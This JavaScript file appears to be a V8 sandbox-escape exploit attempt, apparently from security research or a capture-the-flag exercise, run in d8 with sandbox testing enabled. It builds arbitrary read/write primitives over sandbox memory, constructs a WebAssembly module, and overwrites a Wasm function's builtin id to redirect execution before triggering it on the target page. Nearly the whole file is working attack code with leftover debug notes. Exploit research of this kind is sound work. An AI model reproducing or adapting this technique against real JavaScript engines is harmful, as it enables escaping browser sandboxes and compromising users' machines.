// r --expose-gc --allow-natives-syntax --sandbox-testing    --experimental-wasm-memory64 ../../../tests/t10.js

d8.file.execute('/home/vult/Desktop/v8/v8/test/mjsunit/wasm/wasm-module-builder.js');
let sandboxMemory = new DataView(new Sandbox.MemoryView(0, 0x100000000));

function addrOf(obj) {
    return Sandbox.getAddressOf(obj);
  }
  
  function v8_read64(addr) {
    return sandboxMemory.getBigUint64(Number(addr), true);
  }
  
  function v8_write64(addr, val) {
    return sandboxMemory.setBigInt64(Number(addr), val, true);
  }
  function v8_read32(addr) {
    // return sandboxMemory.getBigUint32(Number(addr), true);
    return BigInt(sandboxMemory.getUint32(Number(addr), true));
    }

function v8_write32(addr, val) {
// return sandboxMemory.setBigInt32(Number(addr), val, true);
return sandboxMemory.setUint32(Number(addr), val, true);
}

// ================= reading heap_base =============================
let sandbox_base = BigInt(Sandbox.base);
console.log("sandbox_base: 0x" + sandbox_base.toString(16));
let target_page = BigInt(Sandbox.targetPage);
console.log("target_page: 0x" + target_page.toString(16));
// ================================================================

const builder = new WasmModuleBuilder();
builder.exportMemoryAs("mem0", 0);
const GB = 1024 * 1024 * 1024;
let $mem0 = builder.addMemory64(1 * GB / kPageSize);

let $box = builder.addStruct([makeField(kWasmFuncRef, true)]);

let $sig_i_l = builder.addType(kSig_i_l); //let kSig_i_l = makeSig([kWasmI64], [kWasmI32]);
// let $Sig_i_iii = builder.addType(kSig_i_iii);

builder.addFunction("func0", kSig_v_l).exportFunc().addBody([ // func 0 receive a int32 and write to that address??
//let kSig_v_i = makeSig([kWasmI32], []);
  kExprLocalGet, 0,
  ...wasmI32Const(0x41414141),
  kExprI32StoreMem, 0, 0, // i32.store offset = -1
]);
builder.addFunction("func1", builder.addType(kSig_l_l)).exportFunc().addBody([ // function 1 convert from int32 to int64
  kExprLocalGet, 0,
//   kExprI32ConvertI64,
  kExprI64Const, 0x81, 0x80, 0x80, 0x80, 0x10,
  kExprI64Mul,
]);


let instance = builder.instantiate();

instance.exports.func1(0n);

%DebugPrint(instance.exports.func1);
// ===============================
// 0x2a7ada
// %SystemBreak();
let id_builtins_function = Number(v8_read32(addrOf(instance.exports.func1)+0xb+1));
console.log("0x" + id_builtins_function.toString(16));

// 0xfc - Builtins_MathLog
//  Command failed with offset 0x4f
v8_write32(BigInt(addrOf(instance.exports.func1)+0xb+1), id_builtins_function - 0x336*0x200);
console.log("0x" + v8_read32(addrOf(instance.exports.func1)+0xb+1).toString(16));


// trigger
instance.exports.func1(Number(target_page));

